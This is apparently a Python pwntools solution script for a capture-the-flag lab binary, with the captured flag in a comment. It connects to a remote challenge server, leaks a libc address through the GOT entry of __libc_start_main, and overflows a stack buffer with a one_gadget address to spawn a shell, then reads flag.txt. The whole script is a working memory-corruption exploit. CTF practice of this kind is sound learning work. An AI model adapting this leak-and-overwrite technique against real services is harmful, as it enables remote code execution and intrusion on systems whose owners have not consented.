#!/usr/bin/env python2
# -*- coding: ascii -*-
from pwn import *

# AngelboyCTF{4LnoMvnymHAkyLE4k56N}

context.arch = 'amd64'

e = ELF('./lab3')

host , port = '35.194.234.201' , 2113

y = remote( host , port )


y.sendafter( ':' , hex( e.got['__libc_start_main'] ) )
y.recvuntil( '0x' )

l = int( y.recvline() , 16 ) - 0x20740
log.success( 'libc -> %s' % hex( l ) )

one = 0xf1117
y.sendlineafter( ':' , 'D' * 0x118 + p64( l + one ) )

sleep( 0.7 )

y.sendline( 'cat ./flag.txt' )

y.interactive()

